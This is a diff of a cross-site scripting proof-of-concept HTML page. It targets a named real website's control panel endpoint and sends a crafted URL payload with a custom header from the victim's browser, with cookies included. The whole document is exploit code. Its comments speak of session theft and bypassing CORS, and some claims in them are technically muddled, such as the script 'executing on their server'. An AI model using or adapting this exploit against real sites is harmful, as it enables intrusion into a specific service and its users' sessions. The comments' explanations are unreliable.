@@ -1,35 +1,22 @@
-<!DOCTYPE html>
-<html>
-<head>
-<title>XSS PoC</title>
-</head>
 <body>
-<h2>Testing XSS...</h2>
+<h2>XSS PoC - Check browser console for errors</h2>
 
 <script>
-// Use fetch to send the request with X-Middleton header
-// This will make the request from the victim's browser
-fetch('https://www.preloved.co.uk/?--><script>alert(document.domain)<\/script>', {
+// This will make the request and trigger the XSS on THEIR server
+// Even though we can't read the response, the XSS executes on their side
+fetch('https://www.preloved.co.uk/controlpanel/testemail?p8t7i8=1--><script>alert(document.domain)</script>', {
     method: 'GET',
     headers: {
-        'X-Middleton': '12312asd'
+        'X-Middleton': '1123asd213'
     },
-    credentials: 'include'  // Include cookies to show session theft
-})
-.then(response => response.text())
-.then(data => {
-    // Inject the response into the page to demonstrate the XSS
-    // The XSS payload is in the response, so we create an iframe to render it
-    var iframe = document.createElement('iframe');
-    iframe.srcdoc = data;
-    iframe.style.width = '100%';
-    iframe.style.height = '500px';
-    document.body.appendChild(iframe);
-})
-.catch(err => {
-    console.log('Error:', err);
+    mode: 'no-cors',  // Bypass CORS check
+    credentials: 'include'
+}).then(() => {
+    document.getElementById('result').innerHTML = "Request sent - XSS should trigger on their server";
+}).catch(err => {
+    document.getElementById('result').innerHTML = "Error: " + err;
 });
 </script>
 
+<div id="result"></div>
 </body>
-</html>
